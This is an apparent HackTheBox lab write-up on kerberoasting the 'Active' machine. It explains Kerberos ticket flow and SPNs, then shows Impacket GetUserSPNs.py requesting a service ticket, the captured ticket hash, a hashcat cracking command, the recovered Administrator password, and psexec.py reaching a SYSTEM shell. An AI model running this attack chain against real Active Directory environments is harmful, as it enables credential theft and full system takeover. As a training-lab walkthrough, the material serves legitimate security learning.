
Always have wondered how kerberoasting actually works and have always used the GetUserSPNs.py like a script kiddie.

So this is how it works:
1. The user requests a TGT (KRB_AS_REQ)
2. The KDC gives the user a TGT (KRB_AS_REP)
3. The user asks for the TGS with the TGT (KRB_TGS_REQ)
4. The KDC gives the user a TGS (KRB_TGS_REP)
5. The user presents the TGS for service access.

![[kerberos authentication.png]]

Step number four is the most important step and to reach that point, you need an authenticated account. This step is important because the TGS which is given by KDC is encrypted using the NTLM password hash of the account who is running the service instance. (KRB_TGS_REP)

HackTheBox says this:
"Kerberoasting is possible because the TGS_REP ticket is encrypted using the NTLM password hash of the account in whose context the service instance is running."

**What are SPNs?**
When you understand the above, you have to understand that Kerberos Authentication uses SPNs (Service Principal Names) to identify the account associated with the corresponding service.

The SPN is an unique identifier for a service instance. When a client wants to authenticate and communicate with a service, it needs to know the SPN assosiated with that service.

When a service has an SPN registered in AD, it allows client to request Kerberos tickets (All of them) on behalf of that service. The KDC produces a ticket encrypted with the service's secret key or NTLM hash. This is when we capture the hash and crack it.

Script kiddie things next:
Activate GetUserSPNs.py from Impacket:

```bash
$ python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
```

```json

Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-06-05 11:33:20.978561             

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$41bde875ab8ac51dc84054d2f543a541$accf39c790282485f6313d60da6580fcfb3a9915d03fa373c0f031d633e7578b6699b104dd40e99214ea4133003d87926dc301ca2a35800268c88568263e1433ec15211959398c5b251c9014edac74824548ebe1e5da26584a0ab95d8e1a68c871a40c2fefa955fb0a0aee4928cb8983be31de0e420f458d3f41bfdc216aa35f908ff707b42c033f0ea790237d09a8538d63fa1b18d569a2c6bfafc8e01824daecdc3482f20e3b84404bfa42000fb4a52b79064ccd68cb07dee115c1934c26637fca9b2334e2aa24d8c9507940bdb4af873fffeef55df8647102da4615c63402a1443ee171f2b84692dd737bdab1e06c65bbd3bbf21b5a92c7ac3cab2c4f3cf182552fd6820fbeb6a9b4307b54626ef091e64b7f89fb160501132d26744fb9ac726c41b1d2b4c4a754749f13d8eb6c0b2d08af9c4919af82cffbf5af055292794eddf6b2306768f793faf6271ee8242c5888d3982ba8bea7e21b500d6c8ecf84d54faaf6ce639ce37a9053d1fc2eba1c4869e6aacdc0a90a4882c50ed997e5883ef2e707e5785820ee0b182559a0990bc3c32a15cbfc7c60bc5fb1ed99a5224cc43f3f1d05735a16a27250455890e818c42496352f99ade8877f8c831a09ef748830f524ab24fe0762c23fa6ba4aa59d4d1fb6c95576b8ed2626d14d41d4f07a761cc5996841676ce7febb961fe51b9ecb8627c8da7c10e9483a701b8f42246ac8cb84fa9f1cc27c88806856e5abdfa717cd3421082928920f3d9dcb19414618cfc757310b861f7f762c35b9d270c7fa88325b7f0c95a0f8e35555e2536dc19c990093d540caaccb876e598c6b395c1c4497ceb8ad9f4aec1d6a96429c1ae1243b5d79c6ea2cf03331ab942e3a36ece11c823fa0648ee33588297d35d742b0d13e921a9ef21e5d5d65cb64c3468c30e18875181c999019a03b3a6e5d5d6a79a5eda9bba78dfecd275cc81c56a39cab08598498eb96fe9e449efec3aed665971d07677a2bd6168239b629c9b79be0c195da1ad1cf4885984aaf99d64e62e28f6d48c697515d4b5ac435d9c46a903516e71d57415caf01f157e7b94605c8c322cb5f9c78dcf8cc8ba896f79b5ee9c4449ba89945978496962a73c170d1666b4f95eb4e177cdf218c6f751e727c70a70aa45dfe494b407230528ea7bc02adaef254f0b13609d60e557d04b39d9b8f76594e754204abb35e0a48e2e2108a8263ba806fc571404f61547ce673a1fff5401c9f046fafbe6283eb654511
```

Cracking with hashcat with the command ```$ hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt```

`-m 13100`:  TGS type 23 (hash mode 13100)

Credentials: ==Administrator : Ticketmaster1968==

```$ python3 psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 -dc-ip 10.10.10.100 -port 445```

```sql
Impacket v0.10.1.dev1+20230518.60609.edef71f1 - Copyright 2022 Fortra

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file QmKWPiIN.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service KDKL on 10.10.10.100.....
[*] Starting service KDKL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
